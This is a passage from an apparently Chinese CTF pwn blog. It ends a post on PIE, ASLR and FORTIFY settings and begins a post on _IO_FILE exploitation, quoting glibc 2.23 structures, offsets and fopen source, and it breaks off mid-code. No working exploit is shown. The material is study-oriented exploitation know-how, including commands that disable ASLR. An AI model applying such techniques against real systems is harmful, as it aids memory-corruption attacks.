<p><code>PIE</code> 保护即位置无关的可执行文件，程序开启地址随机化选、意味着程序每次运行的时候地址都会变化，包含 <code>.bss</code>，<code>.text</code>, <code>.data</code> 等段都会被随机化。</p>
<ul>
<li>开启方式</li>
</ul>
<p><code>PIE</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				// 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c		// 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c		// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		// 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure></div>

<p><code>ASLE</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space # 0 - 表示关闭进程地址空间随机化。</span><br><span class="line">sudo echo 1 &gt; /proc/sys/kernel/randomize_va_space # 1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">sudo echo 2 &gt; /proc/sys/kernel/randomize_va_space # 2 - 表示在1的基础上增加栈和堆的随机化。</span><br></pre></td></tr></table></figure></div>

<p><strong>FORTIFY</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>fority</code> 其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如<code>memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets</code>以及宽字符的变体。</p>
<p>例如 :</p>
<ul>
<li>开启方式</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c							// 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o test test.c		// 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o test test.c		// 较强的检查</span><br></pre></td></tr></table></figure></div>













]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Base_knowledge</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_IO_FILE及相关赛题详细解析</title>
    <url>/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">深入理解Pwn_Heap及相关例题</a></p>
<p><a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.23/source" >源码查看网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文主要参考<a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/126082743?spm=1001.2014.3001.5502" >C0Lin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a class="link"   href="https://sky123.blog.csdn.net/?type=blog" >_sky123_ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>两位宝藏师傅的博客。</p>
<p>本文写的较为冗余，适合和我一样的新手朋友看。文中并没有对堆的手法进行详细的说明，文章的堆利用手法可以看上面的文章（包括了目前 <code>how2heap</code> 里全系列的手法，其他手法有时间会补充到里面）。后面关于 <code>_IO_FILE</code> 利用的手法会更新在这里（方便查）。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="IO相关重要结构体概述"><a href="#IO相关重要结构体概述" class="headerlink" title="IO相关重要结构体概述"></a>IO相关重要结构体概述</h2><p>进行文件读写操作时会为对应文件创建一个 <code>_IO_FILE_plus</code> 结构体，并且链接到 <code>_IO_list_all</code> 链表 <strong>头部</strong> 上，<code>vtable</code> 指向一张虚函数表<code>_IO_jump_t</code>，此表中记录着对文件进行的各种操作，<code>_IO_FILE</code> 和 <code>_IO_jump_t</code> 组成了 <code>_IO_FILE_plus</code>。 <code>stdin, stdout, stderr</code> 是位于 <code>libc.so</code> 中，而通过 <code>fopen</code> 的创建的则是位于堆内存。</p>
<p><strong>glibc-2.23源</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="comment">/* vtable 一般都不可修改，vtable 是否可写跟 libc 有关，有的高版本 libc 反而可写，比如 glibc-2.34。*/</span></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// amd64 如下</span></span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">	<span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>;</span><br><span class="line">	<span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>;   <span class="comment">// 操作起始地址</span></span><br><span class="line">	<span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>;  <span class="comment">// stdin 缓冲结束地址 </span></span><br><span class="line">	<span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>; <span class="comment">// stdin 缓冲起始地址 </span></span><br><span class="line">	<span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>;<span class="comment">// stdout 缓冲起始地址 </span></span><br><span class="line">	<span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>; <span class="comment">// 操作起始地址</span></span><br><span class="line">	<span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>; <span class="comment">// stdout 缓冲结束地址 </span></span><br><span class="line">	<span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>;  <span class="comment">// 缓冲区起始地址 </span></span><br><span class="line">	<span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>;   <span class="comment">// 缓冲区结束地址</span></span><br><span class="line">	<span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>;</span><br><span class="line">	<span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>;</span><br><span class="line">	<span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>;</span><br><span class="line">	<span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>;</span><br><span class="line">	<span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>;</span><br><span class="line">	<span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>;</span><br><span class="line">	<span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>;</span><br><span class="line">    <span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>;</span><br><span class="line">	<span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>;</span><br><span class="line">	<span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>;</span><br><span class="line">	<span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>;</span><br><span class="line">	<span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>;</span><br><span class="line">	<span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>;</span><br><span class="line">	<span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>;</span><br><span class="line">	<span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>;</span><br><span class="line">	<span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>;</span><br><span class="line">	<span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">	<span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">JUMP_FIELD</span>(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    <span class="number">0x8</span>:<span class="built_in">JUMP_FIELD</span>(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    <span class="number">0x10</span>:<span class="built_in">JUMP_FIELD</span>(_IO_finish_t, __finish);</span><br><span class="line">    <span class="number">0x18</span>:<span class="built_in">JUMP_FIELD</span>(_IO_overflow_t, __overflow);</span><br><span class="line">    <span class="number">0x20</span>:<span class="built_in">JUMP_FIELD</span>(_IO_underflow_t, __underflow);</span><br><span class="line">    <span class="number">0x28</span>:<span class="built_in">JUMP_FIELD</span>(_IO_underflow_t, __uflow);</span><br><span class="line">    <span class="number">0x30</span>:<span class="built_in">JUMP_FIELD</span>(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="number">0x38</span>:<span class="built_in">JUMP_FIELD</span>(_IO_xsputn_t, __xsputn);</span><br><span class="line">    <span class="number">0x40</span>:<span class="built_in">JUMP_FIELD</span>(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    <span class="number">0x48</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seekoff_t, __seekoff);</span><br><span class="line">    <span class="number">0x50</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seekpos_t, __seekpos);</span><br><span class="line">    <span class="number">0x58</span>:<span class="built_in">JUMP_FIELD</span>(_IO_setbuf_t, __setbuf);</span><br><span class="line">    <span class="number">0x60</span>:<span class="built_in">JUMP_FIELD</span>(_IO_sync_t, __sync);</span><br><span class="line">    <span class="number">0x68</span>:<span class="built_in">JUMP_FIELD</span>(_IO_doallocate_t, __doallocate);</span><br><span class="line">    <span class="number">0x70</span>:<span class="built_in">JUMP_FIELD</span>(_IO_read_t, __read);</span><br><span class="line">    <span class="number">0x78</span>:<span class="built_in">JUMP_FIELD</span>(_IO_write_t, __write);</span><br><span class="line">    <span class="number">0x80</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seek_t, __seek);</span><br><span class="line">    <span class="number">0x88</span>:<span class="built_in">JUMP_FIELD</span>(_IO_close_t, __close);</span><br><span class="line">    <span class="number">0x90</span>:<span class="built_in">JUMP_FIELD</span>(_IO_stat_t, __stat);</span><br><span class="line">    <span class="number">0x98</span>:<span class="built_in">JUMP_FIELD</span>(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    <span class="number">0xa0</span>:<span class="built_in">JUMP_FIELD</span>(_IO_imbue_t, __imbue);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">        get_column;</span><br><span class="line">        set_column;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> &#123;</span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_marker</span> *_markers;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_chain;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno; <span class="comment">// stderr:2, stdout:1, stdin:0</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="type">int</span> _blksize;</span><br><span class="line">  <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _file;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *_codecvt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> *_wide_data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_freeres_list;</span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      <span class="type">void</span> *__pad1;</span><br><span class="line">      <span class="type">void</span> *__pad2;</span><br><span class="line">      <span class="type">void</span> *__pad3;</span><br><span class="line">      <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="built_in">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="built_in">sizeof</span> (<span class="type">void</span> *) - <span class="built_in">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _IO_FILE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> *_IO_list_all;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stdin_;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stdout_;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stderr_;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure></div>

<p><strong>图解</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/IO_FILE_1.png"
                      alt="IO_FILE_1"
                ></p>
<h2 id="IO相关函数概述"><a href="#IO相关函数概述" class="headerlink" title="IO相关函数概述"></a>IO相关函数概述</h2><ul>
<li><p><code>fopen</code> 未调用 <code>vtable</code> 中的函数，<code>fopen</code> 对应的函数 <code>__fopen_internal</code> 内部会调用 <code>malloc</code> 函数，分配 <code>FILE</code> 结构的空间。因此我们可以获知 <code>FILE</code> 结构是存储在堆上的。</p>
</li>
<li><p>流程</p>
<ul>
<li><p>使用 <code>malloc</code> 分配 <code>FILE</code> 结构</p>
</li>
<li><p>设置 <code>FILE</code> 结构的 <code>vtable</code></p>
</li>
<li><p>初始化分配的 <code>FILE</code> 结构</p>
</li>
<li><p>将初始化的 <code>FILE</code> 结构链入 <code>FILE</code> 结构链表头部</p>
</li>
<li><p>调用系统调用打开文件</p>
</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fopen() 函数</span></span><br><span class="line"><span class="comment">// libio/iofopen.c</span></span><br><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">locked_FILE</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">		_IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> wd;</span><br><span class="line">	&#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="built_in">sizeof</span> (<span class="keyword">struct</span> locked_FILE));   <span class="comment">// 为 FILE 结构分配空间</span></span><br><span class="line">    <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">     new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">    _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps; <span class="comment">// 设置 vtable = &amp;_IO_file_jumps</span></span><br><span class="line">	_IO_file_init (&amp;new_f-&gt;fp); <span class="comment">// 调用 _IO_file_init 函数进行初始化</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">	new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)    <span class="comment">// 打开目标文件</span></span><br><span class="line">        <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line">    _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">	<span class="built_in">free</span> (new_f);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/fileops.c</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">       of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">       position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">	fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">    fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line">    